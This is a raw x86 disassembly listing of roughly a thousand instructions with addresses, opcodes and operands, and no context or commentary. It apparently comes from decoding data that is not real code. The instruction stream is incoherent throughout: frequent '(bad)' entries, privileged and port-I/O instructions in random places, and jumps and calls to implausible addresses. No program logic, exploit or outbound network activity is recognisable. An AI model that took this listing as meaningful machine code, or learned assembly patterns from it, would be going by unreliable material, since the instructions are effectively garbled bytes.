  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
